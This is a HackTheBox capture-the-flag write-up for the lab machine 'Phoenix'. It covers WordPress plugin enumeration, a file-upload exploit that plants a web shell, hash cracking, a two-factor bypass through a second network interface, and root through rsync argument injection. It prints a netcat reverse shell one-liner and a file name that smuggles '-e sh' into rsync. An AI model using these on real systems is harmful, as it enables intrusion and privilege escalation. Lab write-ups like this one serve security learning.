---
title: Phoenix HackTheBox Writeup
tags: [writeup,rest,python,hackthebox,linux,api,suid]
style: border
color: success
description: ""
---


![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/1.png)

## Scanning
We list previously with a quick scan to all ports with **nmap**, we will obtain the following ports to discover the services and versions that are available:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/2.png)

## Enumeration
In the **nmap** output, we saw that it redirects to "*https://phoenix.htb*", so we add it to our "*/etc/hosts*" file and access the website.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/3.png)

We list an e-mail address, it never hurts to have identified users and e-mails.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/4.png)

We launch the **whatweb** tool and see that the site is developed with *Wordpress 5.9*.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/5.png)

We go back to **nmap**, this time we will use a file and folder enumeration script, we discover the "*forum*" directory and the "*robots.txt*" file.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/6.png)

We see that the site has protections against brute force attacks, so we will avoid making automated attacks.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/7.png)

We see the content of the file "*robots.txt*":

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/8.png)

We found a file containing possible valid users for the CMS:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/9.png)

And indeed, we list two CMS users.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/10.png)

Accessing user profiles, we see different posts, we also identify a registration and authentication form.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/11.png)

We also find a forum in the "*forum*" directory, we see that it allows us to register users and we see that there are some posts published.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/12.png)

We list more users from the "*members*" section.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/13.png)


## Exploitation

We create an account and access the site, we see that the plugin "*Pie Register*" is installed, this plugin has public exploits that could also apply to the version that is installed.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/14.png)

We looked at the source code and found the exact version of *pie-register 3.7.2.6*, but we did not find any exploit that we could use.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/15.png)

I was sure that there were more plugins installed, there were no other services that could be exploited, so I searched the internet for a list of WP plugins. But we had a problem, the server is protected against brute force, so launching automatic tools would be a problem (known user-agent, requests through threads, etc...). 

So I set up an oneliner with two loops:
1. it goes making a timed request in random mode, pretending to be a person and not an automatic tool with a curl indicating the path to the plugin.
2. The second loop, will be in charge of testing static files to obtain a different response from the server and to identify possible existing plugins. 

**Note**: *For your amusement, I have not put a fairly typical file in the plugins, that part of the enumeration I leave to you (So you have work to do ;) )*

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/16.png)

We list the plugin "*download-from-files*", this plugin has a file uploading exploit published in **exploit-db.com**:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/17.png)

We create a PHP file with a command console and we see that the exploit gives error due to server certificate verification.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/18.png)

We add the "*verify=False*" in all script requests and save the exploit

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/19.png)

And now we see that it has created the file:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/20.png)

But we see that it doesn't interpret the PHP code.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/21.png)

We try to rename it to *.phtml*, run the exploit again and now we see that it works.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/22.png)

##### Reverse shell code:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

We listen to **netcat**, take the request to **Burp**, encode the code and send the request.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/23.png)

And we managed to gain access to the machine:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/24.png)

We read the file "*wp-config.php*" and get the DB credentials.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/25.png)

We access the database and extract the hashes from **WordPress**:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/26.png)

We will manage to crack it with **hashcat** and the *rockyou.txt* dictionary:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/27.png)

In the internal enumeration, it showed two users that had a folder in home, so I tried the creds with both of them, but it only seemed to work with the "*editor*" user.

But as it is appreciated in the image, it was asking for a code of a double authentication factor.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/28.png)

We performed a search filtering by *"*authentica*"*, we managed to see plugins and the "**google-authenticator**" binary deployed on the machine.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/29.png)

We run the binary and get the QR code and the keys:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/30.png)

It does not work, I also installed it in the mobile app, in case the synchronization of my computer was not right, but it still failed.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/31.png)

We reviewed the network interfaces and found that there are two:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/32.png)

We set up an oneliner with a port scan, coincidentally the IP of the 2nd network interface has the same ports open, so it is likely that we can connect via SSH and we can evade protection if we come from the other IP address.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/33.png)

We connect with **netcat**, we see that we can establish the connection and now we connect by **SSH** to the other IP and insert the password, it seems that it does not ask for 2FA and we manage to read the flag of *user.txt*.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/34.png)


## Privilege Escalation
We find the "*backups*" directory, we see that there are several backup files, this could mean that there is a script running in the background.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/35.png)

We download and run **pspy64** to check if any scheduled task is running, but nothing comes up.

We run the **linpeas** script and list interesting files:

##### Sudo version 1.8.31 and CVEs Check
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/36.png)

After the desperation, I knew that there had to be some script or binary that was running on a scheduled basis, it would not make sense to have a backup directory sorted by dates and times 3 minutes apart.

So I launched several finds looking for files by extensions, until I stumbled upon this binary (or script?):

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/37.png)

We run it, from the outputs, it seems to run **gzip** and **rsync** as the *root* user, we have not found this on other machines.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/38.png)

We transfer the file and run a strace on it and we see that it executes a "*/bin/sh*" where it will call the rest of the binaries... And of course, those binaries will be printed in an oneliner, so we could get them to execute code by transforming the title of a file in part of a command and manage to inject it in the oneliner.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/39.png)

Let's remember that **rsync** allows to execute commands with the "*-e*" flag (e.g. [Powergrid - Vulnhub machine](https://www.hackingarticles.in/powergrid-1-0-1-vulnhub-walkthrough/)).

We create a file "*m3.sh*" with the same reverse shell as before (we also recycle ;) ) and create a file named "*-e sh m3.sh*", the latter should be interpreted and executed by **rsync**, managing to run the malicious script and gaining access as the user or service that runs it.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/40.png)

We set a **netcat** to listen and wait 3 minutes, we manage to get an interactive connection with the *root* user and we manage to read the flag.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Phoenix/41.png)




